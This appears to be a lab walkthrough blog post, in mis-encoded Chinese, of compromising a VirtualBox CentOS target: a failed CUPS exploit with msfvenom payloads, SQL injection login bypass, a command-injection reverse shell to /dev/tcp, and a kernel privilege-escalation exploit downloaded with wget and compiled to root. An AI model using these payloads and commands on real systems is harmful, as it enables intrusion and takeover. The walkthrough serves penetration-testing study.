// MySQL æœåŠ¡
// è€ƒè™‘ SQL æ³¨å…¥
PORT     STATE SERVICE  VERSION
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:EB:BA:50 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
</code></pre></div></td></tr></table></div>
<p>åŒæ—¶ç¡®å®šé¶æœºæ“ä½œç³»ç»Ÿä¸º <code>CentOS</code></p>
<hr />
<h3 id="getshell">Getshell å°è¯•</h3>
<h4 id="ipp-getshell">ipp æ–¹å‘ï¼ˆGetShell å¤±è´¥ï¼‰</h4>
<p>CUPS 1.1 æ˜¯è¿™ä¸ªæœåŠ¡çš„ç¬¬ä¸€ä¸ªç¨³å®šå‘è¡Œç‰ˆï¼Œè€ƒè™‘ <code>searchsploit</code> è·å–å·²çŸ¥ <code>exploit</code></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; searchsploit cups 1.1
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CUPS 1.1.x - &#39;.HPGL&#39; File Processor Buffer Overflow                   | linux/remote/24977.txt
CUPS 1.1.x - Cupsd Request Method Denial of Service                   | linux/dos/22619.txt
CUPS 1.1.x - Negative Length HTTP Header                              | linux/remote/22106.txt
CUPS 1.1.x - UDP Packet Remote Denial of Service                      | linux/dos/24599.txt
CUPS &lt; 1.3.8-4 - Local Privilege Escalation                           | multiple/local/7550.c
CUPS &lt; 2.0.3 - Multiple Vulnerabilities                               | multiple/remote/37336.txt
CUPS &lt; 2.0.3 - Remote Command Execution                               | linux/remote/41233.py
CUPS Server 1.1 - GET Denial of Service                               | linux/dos/1196.c
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div></td></tr></table></div>
<p><code>CUPS &lt; 2.0.3 - Remote Command Execution</code> è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè€ƒè™‘ä½¿ç”¨è¿™ä¸ªï¼Œä½¿ç”¨ <code>searchsploit -m 41233</code> å–ä¸€ä»½åˆ°æœ¬åœ°è¿è¡Œï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python 41233.py
  File &quot;/home/kali/Desktop/41233.py&quot;, line 16
    print &#39;&#39;&#39;
    ^^^^^^^^^
SyntaxError: Missing parentheses in call to &#39;print&#39;. Did you mean print(...)?
</code></pre></div></td></tr></table></div>
<p>æŠŠ SyntaxError çš„å†…å®¹ SFTW ä¸€ä¸‹å‘ç°æ˜¯å› ä¸ºä½¿ç”¨äº† Python 2 è¯­æ³•ï¼Œç»§ç»­ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python2 41233.py
python script.py &lt;args&gt;
   -h, --help:             Show this message
   -a, --rhost:            Target IP address
   -b, --rport:            Target IPP service port
   -c, --lib               /path/to/payload.so
   -f, --stomp-only        Only stomp the ACL (no postex)

Examples:
python script.py -a 10.10.10.10 -b 631 -f
python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so
</code></pre></div></td></tr></table></div>
<p>å‘ç°éœ€è¦æ„é€  <code>payload.so</code> å¹¶ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¿™å’Œ Kioptix 1 ä¸­é‡åˆ°çš„å¼€ç®±å³ç”¨çš„è„šæœ¬ä¸ä¸€æ ·</p>
<p>ç»§ç»­ STFW å‘ç°äº† <code>msfvenom</code>ï¼Œæ”¯æŒç”Ÿæˆå„ç§å„æ ·çš„ payloadï¼ˆé¢„è£…äº Kaliï¼‰</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code>// è¿è¡Œ msfvenom -h
&gt; msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe

Options:
    // åªå–äº†æœ€æ ¸å¿ƒçš„ä¸‰ä¸ªå‚æ•°ï¼Œå’Œä¸Šé¢çš„ä¾‹å­ä¸€æ ·
    // --list å¯ä»¥å…·ä½“åˆ—å‡ºå¯è¡Œçš„å‚æ•°
    -p, --payload         &lt;payload&gt;  Payload to use (--list payloads to list, --list-options for arguments). Specify &#39;-&#39; or STDIN for custom
    -f, --format          &lt;format&gt;   Output format (use --list formats to list)
    -o, --out             &lt;path&gt;     Save the payload to a file

// payload æŸ¥è¯¢
// åªåˆ—å‡ºäº†å¤„äºå€™é€‰åå•çš„ payloadï¼ˆæ„é€ åå‘ shellï¼‰
&gt; msfvenom --list payloads

Framework Payloads (1680 total) [--payload &lt;value&gt;]
===================================================

    Name                                              Description
    ----                                              -----------
    linux/x64/meterpreter/reverse_tcp                 Inject the mettle server payload (staged).
                                                      Connect back to the attacker
    linux/x64/shell/reverse_tcp                       Spawn a command shell (staged). Connect back to
                                                      the attacker

// -f æŸ¥è¯¢ç•¥ï¼Œé€‰æ‹© elf-so è¡¨ç¤ºè¾“å‡º .so æ–‡ä»¶
// è€ƒè™‘åˆ°é…ç½®éš¾åº¦ï¼Œæœ€ç»ˆé€‰æ‹©äº† linux/x64/shell/reverse_tcp
&gt; msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.0.2.3 LPORT=1234 -f elf-so -o payload.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf-so file: 532 bytes
Saved as: payload.so
</code></pre></div></td></tr></table></div>
<p>ç„¶åè¿è¡Œï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python2 41233.py -a 10.0.2.15 -b 631 -c ./payload.so
[*]     locate available printer
[-]     no printers
</code></pre></div></td></tr></table></div>
<p>å‘ç°æ²¡æœ‰é…ç½®æ‰“å°æœºï¼Œä» ipp æ–¹å‘ Getshell çš„æ–¹å‘å¤±è´¥</p>
<h4 id="httpsql">HTTP/SQL æ–¹å‘</h4>
<p>è®¿é—® <code>http://10.0.2.15/</code>ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ â€œ<strong>Remote System Administration Login</strong>â€ï¼Œéœ€è¦è¾“å…¥è´¦å·å’Œå¯†ç </p>
<p>è€ƒè™‘åˆ°ä½¿ç”¨äº† MySQL æœåŠ¡ï¼Œå°è¯• SQL æ³¨å…¥ï¼š</p>
<p><img alt="image-20251019222700649" src="../images/image-20251019222700649.png" /></p>
<p>æ³¨å…¥æœ‰æ•ˆï¼Œç™»å½•åæ˜¯ä¸€ä¸ªå¯ä»¥ Ping æ“ä½œçš„é¡µé¢</p>
<p><img alt="image-20251019223000171" src="../images/image-20251019223000171.png" /></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code>127.0.0.1

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.283 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.411 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.508 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 0.283/0.400/0.508/0.095 ms, pipe 2
</code></pre></div></td></tr></table></div>
<p>å‘ç° Web Console ç›´æ¥æ‰§è¡Œäº†ä¸€ä¸ª <code>ping 127.0.0.1</code> çš„æ“ä½œï¼Œå°è¯•ä¸€ä¸ªå‘½ä»¤æ³¨å…¥</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; 127.0.0.1 | whoami
apache
</code></pre></div></td></tr></table></div>
<p>éå¸¸å¬è¯ï¼Œæ­¤æ—¶å¯ä»¥ç†è§£ä¸ºè·å¾—äº†ä¸€ä¸ªä½æƒé™ Shellï¼Œæ¥ä¸‹æ¥è€ƒè™‘ææƒ</p>
<p>ä¸ºäº†æ–¹ä¾¿æ“ä½œæˆ‘ä»¬å…ˆè·å–ä¸€ä¸ªåå‘ Shellï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span>
<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>// Web é¡µé¢ï¼Œå‘½ä»¤æ³¨å…¥
&gt; 127.0.0.1|bash -i &gt;&amp; /dev/tcp/10.0.2.3/1234 0&gt;&amp;1
// æ”»å‡»æœº Shellï¼Œnc è¿æ¥åå‘ Shell
&gt; nc -lvp 1234  
listening on [any] 1234 ...
10.0.2.15: inverse host lookup failed: Unknown host
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.15] 32771
bash: no job control in this shell
bash-3.00$ 
</code></pre></div></td></tr></table></div>
<p>Getshll æ“ä½œå®Œæˆ</p>
<h3 id="_4">ææƒå°è¯•</h3>
<h4 id="sql-udf">SQL UDF ææƒï¼ˆææƒå¤±è´¥ï¼‰</h4>
<p>MySQL æœåŠ¡é€šå¸¸ä»¥é«˜æƒé™è¿è¡Œï¼Œå¯ä»¥å…ˆè·å¾— MySQL çš„ç®¡ç†å‘˜è´¦æˆ·ï¼Œå†é€šè¿‡ UDP æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span></pre></div></td><td class="code"><div><pre><span></span><code>/* /var/www/html/index.php å­˜æ”¾ Apache çš„æ–‡æ¡£æ ¹ç›®å½•ï¼ˆé»˜è®¤ï¼‰*/
&gt; bash-3.00$ cat /var/www/html/index.php
&lt;?php
        // è¿™é‡Œæ˜¯ MySQL å‡­æ®ï¼Œæ˜æ–‡å­˜å‚¨
        mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());
        //print &quot;Connected to MySQL&lt;br /&gt;&quot;;
        mysql_select_db(&quot;webapp&quot;);

        if ($_POST[&#39;uname&#39;] != &quot;&quot;){
                $username = $_POST[&#39;uname&#39;];
                $password = $_POST[&#39;psw&#39;];
                // SQL æ³¨å…¥æ¼æ´
                $query = &quot;SELECT * FROM users WHERE username = &#39;$username&#39; AND password=&#39;$password&#39;&quot;;
                //print $query.&quot;&lt;br&gt;&quot;;
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print &quot;ID: &quot;.$row[&#39;id&#39;].&quot;&lt;br /&gt;&quot;;
        }

?&gt;

/* ping å‘½ä»¤æ³¨å…¥æ—¶çš„ php é¡µé¢ */
&gt; bash-3.00$ cat /var/www/html/pingit.php
&lt;?php

print $_POST[&#39;ip&#39;];
if (isset($_POST[&#39;submit&#39;])){
        $target = $_REQUEST[ &#39;ip&#39; ];
        echo &#39;&lt;pre&gt;&#39;;
        echo shell_exec( &#39;ping -c 3 &#39; . $target );
        echo &#39;&lt;/pre&gt;&#39;;
    }
?&gt;
</code></pre></div></td></tr></table></div>
<p>å°è¯•ä¿®æ”¹ <code>pingit.php</code> ææƒå‘ç°æ²¡æœ‰æƒé™ï¼Œæ ¹æ® <code>index.php</code> çš„æ˜æ–‡è´¦å·å¯†ç ç™»å½• MySQL</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code>bash-3.00$ mysql -u john -p
Enter password: hiroshima
// è¿›å…¥ MySQL
// åå‘ Shell ä¸‹æŒ‡ä»¤è¾“å…¥ä¼¼ä¹æœ‰é—®é¢˜ï¼Œç¼“å†²åŒºå†…å®¹ä¸ä¼šç«‹å³è¾“å‡º
SELECT @@version;
@@version
4.1.22

SELECT @@plugin_dir;
ERROR 1193 (HY000) at line 2: Unknown system variable &#39;plugin_dir&#39;

system chmod +s /bin/bash
chmod: changing permissions of `/bin/bash&#39;: Operation not permitted

select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1)\G;
*************************** 1. row ***************************
                 Host: localhost
                 User: john
             Password: 5a6914ba69e02807
          Select_priv: Y
          Insert_priv: Y
          Update_priv: Y
          Delete_priv: Y
          Create_priv: N
            Drop_priv: N
          Reload_priv: N
        Shutdown_priv: N
         Process_priv: N
            File_priv: N        // æ²¡æœ‰å†™å…¥æ–‡ä»¶çš„æƒé™
           Grant_priv: N
      References_priv: N
           Index_priv: N
           Alter_priv: N
         Show_db_priv: N
           Super_priv: N        // ä¸æ˜¯ç®¡ç†å‘˜
Create_tmp_table_priv: N
     Lock_tables_priv: N
         Execute_priv: N
      Repl_slave_priv: N
     Repl_client_priv: N
             ssl_type: 
           ssl_cipher: 
          x509_issuer: 
         x509_subject: 
        max_questions: 0
          max_updates: 0
      max_connections: 0
</code></pre></div></td></tr></table></div>
<p>ç›®å‰çš„æ™®é€šè´¦å·é«˜åº¦å—é™ï¼Œé‚æ”¾å¼ƒ SQL æ–¹å‘</p>
<h4 id="kernal">Kernal å†…æ ¸æ¼æ´</h4>
<p>ä¹‹å‰æœ‰ç¡®å®šæ“ä½œç³»ç»Ÿä¸º CentOSï¼Œå…ˆè¿›ä¸€æ­¥è·å–ç³»ç»Ÿç‰ˆæœ¬ï¼Œç„¶åä¸Šä¼ ä¸€ä»½å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´è„šæœ¬</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code>/* é¶æœºåå‘ Shell */
bash-3.00$ cat /etc/lsb-release.d
CentOS release 4.5 (Final)
// æ”¶é›†ä¿¡æ¯ï¼šé¶æœºä¸º CentOS 4.5

/* æ”»å‡»æœº Shell */
&gt; searchsploit centos 4.5
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox | linux/local/9479.c
Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Cor | linux_x86/local/9542.c
Linux Kernel 3.14.5 (CentOS 7 / RHEL) - &#39;libfutex&#39; Local Privilege E | linux/local/35370.c
--------------------------------------------------------------------- ---------------------------------
&gt; searchsploit -m 9542
  Exploit: Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - &#39;ip_append_data()&#39; Ring0 Privilege Escalation (1)
      URL: https://www.exploit-db.com/exploits/9542
     Path: /usr/share/exploitdb/exploits/linux_x86/local/9542.c
    Codes: CVE-2009-2698
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/9542.c

&gt; python3 -m http.server 1145
Serving HTTP on 0.0.0.0 port 1145 (http://0.0.0.0:1145/) ...
// æ”»å‡»æœºä½¿ç”¨ http ä¸Šä¼  9542.c

/* é¶æœºæ¥æ”¶æ–‡ä»¶ï¼Œç¼–è¯‘è¿è¡Œ */
bash-3.00$ cd /tmp
bash-3.00$ wget 10.0.2.3:1145/9542.c
--15:22:52--  http://10.0.2.3:1145/9542.c
           =&gt; `9542.c&#39;
Connecting to 10.0.2.3:1145... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,535 (2.5K) [text/x-csrc]

    0K ..                                                    100%  109.89 MB/s

15:22:52 (109.89 MB/s) - `9542.c&#39; saved [2535/2535]

bash-3.00$ gcc 9542.c -o exploit
9542.c:109:28: warning: no newline at end of file
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# whoami
root
// è·å¾—äº† root æƒé™ï¼Œä½¿ç”¨ passwd ä¿®æ”¹å¯†ç 
</code></pre></div></td></tr></table></div>
<hr />
<h2 id="_5">æ¸—é€ç»“æœ</h2>
<p>æˆåŠŸè·å–äº† root æƒé™å¹¶ä¸”ä¿®æ”¹äº† root å¯†ç ï¼Œç™»å½•é¶æœºç•Œé¢ï¼Œè¾“å…¥æ–°å¯†ç è¿›å…¥ root è´¦å·ï¼š</p>
<p><img alt="image-20251020064850024" src="../images/image-20251020064850024.png" /></p>
<hr />
<h2 id="_6">é—®é¢˜åˆ†æ/å¯ç¤º</h2>
<ol>
<li>ipp æœåŠ¡æœ‰å¯¹åº”çš„ exploitï¼Œä½†æ˜¯åœ¨å„ä¸ªé˜¶æ®µéƒ½å°è¯•å¤±è´¥</li>
</ol>
<p>ç»è¿‡æµ‹è¯•ï¼Œipp æœåŠ¡å¯¹åº”çš„ Getshell è„šæœ¬å’Œæœ¬åœ°ææƒè„šæœ¬éƒ½å› ä¸ºæ²¡æœ‰å¯ç”¨æ‰“å°æœºæœåŠ¡è€Œå°è¯•å¤±è´¥ï¼Œé€šè¿‡å…¶ä»–æ–¹æ³•è·å¾—ä½æƒé™ Shell åä¹Ÿæ²¡æœ‰æƒé™è®¾ç½®è™šæ‹Ÿæ‰“å°æœºã€‚å¹¶ä¸” nmap æ‰«ææ—¶å·²ç»å‡ºç°äº† 403 Forbidden çŠ¶æ€ç ï¼Œæš—ç¤ºåº”è¯¥å°½æ—©è½¬ç§»æ–¹å‘ï¼Œé¿å…æµªè´¹æ—¶é—´</p>
<ol>
<li>Getshell åå¯ä»¥ä¼˜å…ˆå°è¯•è¿›è¡Œå†…æ ¸æ”»å‡»ï¼Œå› ä¸ºé¶æœºçš„å„ä¸ªæœåŠ¡éƒ½å¾ˆå¤è€ï¼Œè€ƒè™‘é¶æœºç³»ç»Ÿå†…æ ¸æœ‰æˆç†Ÿæ¼æ´åˆ©ç”¨ï¼Œå°è¯•å¤±è´¥åå†è€ƒè™‘ SUIDï¼ŒSQL UDF ç­‰æ–¹å‘çš„ææƒ</li>
</ol>
<hr />
<h2 id="_7">å…¶ä»–</h2>
<p>â€‹   æ€»ç”¨æ—¶ 4hï¼ŒæŸ¥èµ„æ–™ + è¯•é”™ç”¨æ—¶ 2.5h</p>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="../../../stylesheets/extra.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>